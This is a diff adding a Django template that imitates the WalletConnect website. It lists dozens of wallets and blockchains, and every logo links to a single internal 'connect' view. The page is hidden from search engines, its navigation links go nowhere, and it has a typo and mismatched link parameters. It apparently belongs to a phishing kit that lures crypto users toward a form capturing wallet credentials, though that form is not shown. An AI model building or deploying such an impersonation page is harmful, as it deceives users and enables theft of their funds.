@@ -1,0 +1,448 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="robots" content="noindex,nofollow">
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="{% static ''%}assets/main.css" type="text/css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
+    <meta property="og:image" content="images/logo.html">
+    <link rel="icon" href="{% static ''%}assets/logo.svg">
+    <script>
+function show() {
+  var x = document.getElementById("hidden");
+  if (x.style.display === "none") {
+    x.style.display = "block";
+  } else {
+    x.style.display = "none";
+  }
+
+  if (x.style.display === "block") {
+    document.getElementById("btn").innerHTML = "Show Less &uarr;";
+  }
+}
+
+
+
+    </script>
+    <title>WalletConnect</title>
+</head>
+<body>
+<center>
+    <div class="top">
+        <a href="#footer?v" class="left">Github</a>
+
+        <a href="#?v" class="left">Docs</a>
+        <a href="{% url 'index' %}" class="main"><img src="{% static ''%}assets/logo.svg" alt="logo"></a>
+        <a href="#wallets?v" class="left">Wallets</a>
+        <a href="#?v" class="left">Apps</a>
+    </div>
+    <br>
+    <div class="gFeYHJ">WalletConnect</div>
+
+    <div class="lpfxqP">Open protocol for connecting Wallets to Dapps</div>
+    <br>
+
+    <div class="dXgqeu">
+        <img src="{% static ''%}assets/banner.png" alt="WalletConnect">
+    </div>
+
+    <div class="bout">
+        <h2 class="home">What is WalletConnect?</h2>
+        <p>WalletConnect is an open source protocol for connecting decentralised applications to mobile wallets with QR
+            code scanning or deep linking.
+            A user can interact securely with any Dapp from their mobile phone, making WalletConnect wallets a safer
+            choice compared to desktop or browser
+            extension wallets.</p><br>
+        <h2 class="home">How does it work?</h2>
+        <p>WalletConnect connects web applications to supported <a href="index.html#">mobile wallets</a>. WalletConnect
+            session is started by a scanning a QR
+            code (desktop) or by clicking an application deep link (mobile).</p>
+    </div>
+
+    <div class="wallets" id="wallets">
+        <h1 class="home">Wallets</h1>
+        <p>Multiple iOS and Android wallets support the WalletConnect protocol. Interaction between mobile apps and
+            mobile browsers are supported via mobile deep linking.</p>
+
+        <br>
+        <div class="all">
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=metamask"><img src="{% static ''%}assets/metamask.png"></a><br>
+                MetaMask
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=MEW+wallet"><img src="{% static ''%}assets/MEW.png"></a><br>
+                MEW Wallet
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=trust+wallet"><img
+                        src="{% static ''%}assets/trustwallet.png"></a><br>
+                Trust Wallet
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=wallet+connect"><img src="{% static ''%}assets/logo.svg"></a><br>
+                Wallect<br>Connect
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=coinbase+wallet"><img
+                        src="{% static ''%}assets/coinbase.jpg"></a><br>
+                Coinbase Wallet
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=atomic+wallet"><img src="{% static ''%}assets/atomic.png"></a><br>
+                Atomic Wallet
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=binance+smart+chain"><img
+                        src="{% static ''%}assets/binance.png"></a><br>
+                Binance Smart Chain
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=bnb"><img src="{% static ''%}assets/bnb.png"></a><br>
+                BNB
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=polkadot"><img src="{% static ''%}assets/polkadot.png"></a><br>
+                Polkadot
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=xrp"><img src="{% static ''%}assets/xrp.png"></a><br>
+                XRP
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=stellar"><img src="{% static ''%}assets/stellar.png"></a><br>
+                Stellar
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=tezos"><img src="{% static ''%}assets/tezos.png"></a><br>
+                Tezos
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=theta"><img src="{% static ''%}assets/theta.png"></a><br>
+                Theta
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=tron"><img src="{% static ''%}assets/tron.png"></a><br>
+                Tron
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=cosmos"><img src="{% static ''%}assets/cosmos.png"></a><br>
+                Cosmos
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=kava"><img src="{% static ''%}assets/kava.png"></a><br>
+                Kava
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=filecoin"><img src="{% static ''%}assets/filecoin.png"></a><br>
+                Filecoin
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=solana"><img src="{% static ''%}assets/solana.png"></a><br>
+                Solana
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=ethereum+classic"><img
+                        src="{% static ''%}assets/ethereum-classic.png"></a><br>
+                Ethereum Classic
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=zilliqa"><img src="{% static ''%}assets/zilliqa.png"></a><br>
+                Zilliqa
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=elrond"><img src="{% static ''%}assets/elrond.jpg"></a><br>
+                Elrond
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=waves"><img src="{% static ''%}assets/waves.png"></a><br>
+                Waves
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=icon"><img src="{% static ''%}assets/icon.png"></a><br>
+                ICON
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=ontology"><img src="{% static ''%}assets/ontology.png"></a><br>
+                Ontology
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=trust+vault"><img src="{% static ''%}assets/harmony.jpg"></a><br>
+                Harmony
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=trust+vault"><img src="{% static ''%}assets/parsiq.jpg"></a><br>
+                Parsiq
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=uni+swap"><img src="{% static ''%}assets/uniswap.png"></a><br>
+                Uniswap
+            </div>
+
+            <div class="apps">
+                <a href="{% url 'connect' %}?w=pancakeswap+vault"><img
+                        src="{% static ''%}assets/pancakeswap.png"></a><br>
+                PancakeSwap
+            </div>
+
+
+        </div>
+        <br>
+        <button onclick="show()" class="btn" id="btn">Show More ↓</button>
+        <br><br>
+        <div class="hidden" id="hidden">
+            <div class="all">
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=nano"><img src="{% static ''%}assets/nano.png"></a><br>
+                    Nano
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=tomo+chain"><img src="{% static ''%}assets/tomo.png"></a><br>
+                    Tomo Chain
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=iotex"><img src="{% static ''%}assets/iotex.png"></a><br>
+                    IoTex
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=wanchain"><img src="{% static ''%}assets/wanchain.png"></a><br>
+                    Wanchain
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=kin"><img src="{% static ''%}assets/kin.png"></a><br>
+                    Kin
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=nimiq"><img src="{% static ''%}assets/nimiq.png"></a><br>
+                    Nimiq
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=aion"><img src="{% static ''%}assets/aion.png"></a><br>
+                    Aion
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=thunder-token"><img src="{% static ''%}assets/thundertoken.png"></a><br>
+                    Thunder Token
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=aerternity"><img src="{% static ''%}assets/aeternity.png"></a><br>
+                    Aeternity
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=nebulas"><img src="{% static ''%}assets/nebulas.png"></a><br>
+                    Nebulas
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=fio"><img src="{% static ''%}assets/fio.png"></a><br>
+                    FIO
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=gochain"><img src="{% static ''%}assets/gochain.png"></a><br>
+                    GoChain
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=POA+network"><img src="{% static ''%}assets/poa.png"></a><br>
+                    POA Network
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=callisto"><img src="{% static ''%}assets/callisto.png"></a><br>
+                    Callisto
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=bitpay"><img src="{% static ''%}assets/bitpay.jpg"></a><br>
+                    BitPay
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=aktionariat"><img
+                            src="{% static ''%}assets/aktionariat.png"></a><br>
+                    Aktionariat
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=atwallet"><img src="{% static ''%}assets/atwallet.png"></a><br>
+                    AtWallet
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=guard+wallet"><img src="{% static ''%}assets/guard.png"></a><br>
+                    Guard Wallet
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=aave"><img src="{% static ''%}assets/aave.jpg"></a><br>
+                    AAVE
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=exodus"><img src="{% static ''%}assets/exodus.jpg"></a><br>
+                    Exodus
+                </div>
+
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=enjin"><img src="{% static ''%}assets/enjin.jpg"></a><br>
+                    Enjin
+                </div>
+
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=skale"><img src="{% static ''%}assets/skale.png"></a><br>
+                    Skale
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=portis"><img src="{% static ''%}assets/portis.png"></a><br>
+                    Portis
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=trezor"><img src="{% static ''%}assets/trezor.png"></a><br>
+                    Trezor
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=squarelink"><img src="{% static ''%}assets/squarelink.png"></a><br>
+                    Squarelink
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=torus"><img src="{% static ''%}assets/torus.jpg"></a><br>
+                    Torus
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=vechain"><img src="{% static ''%}assets/vechain.jpg"></a><br>
+                    VeChain
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=scatter+wallet"><img src="{% static ''%}assets/scatter.jpg"></a><br>
+                    Scatter Wallet
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=math+wallet"><img
+                            src="{% static ''%}assets/math-wallet.png"></a><br>
+                    Math Wallet
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=fortmatic"><img src="{% static ''%}assets/fortmatic.png"></a><br>
+                    FortMatic
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=digitex"><img src="{% static ''%}assets/digitex.png"></a><br>
+                    Digitex
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=ledger"><img src="{% static ''%}assets/ledger.png"></a><br>
+                    Ledger
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=defiat"><img src="{% static ''%}assets/defiat.jpg"></a><br>
+                    Defiat
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=authereum"><img src="{% static ''%}assets/authereum.png"></a><br>
+                    Authereum
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=flare+wallet"><img src="{% static ''%}assets/flare.jpg"></a><br>
+                    Flare Wallet
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=zelcore"><img src="{% static ''%}assets/zelcore.png"></a><br>
+                    Zelcore
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=bitkeep"><img src="{% static ''%}assets/bitkeep.png"></a><br>
+                    BitKeep
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=coin98"><img src="{% static ''%}assets/coin98.png"></a><br>
+                    Coin98
+                </div>
+
+                <div class="apps">
+                    <a href="{% url 'connect' %}?w=trust+vault"><img src="{% static ''%}assets/trustvault.png"></a><br>
+                    Trust Vault
+                </div>
+
+            </div>
+
+        </div>
+
+
+    </div>
+
+    <footer>
+        <div id="footer">
+            <p><img src="{% static ''%}assets/discord.svg" class="footimg"> <a
+                    href="https://discord.gg/jhxMvxP">Discord</a></p><br>
+            <p><img src="{% static ''%}assets/telegram.svg" class="footimg"> <a
+                    href="https://t.me/walletconnect_announcements">Telegram</a>
+            </p><br>
+            <p><img src="{% static ''%}assets/twitter.svg" class="footimg"> <a
+                    href="https://twitter.walletconnect.org/">Twitter</a>
+            </p><br>
+            <p><img src="{% static ''%}assets/github.svg" class="footimg"> <a href="https://github.com/walletconnect">Github</a>
+            </p>
+            <br>
+        </div>
+    </footer>
+</center>
+</body>
+</html>
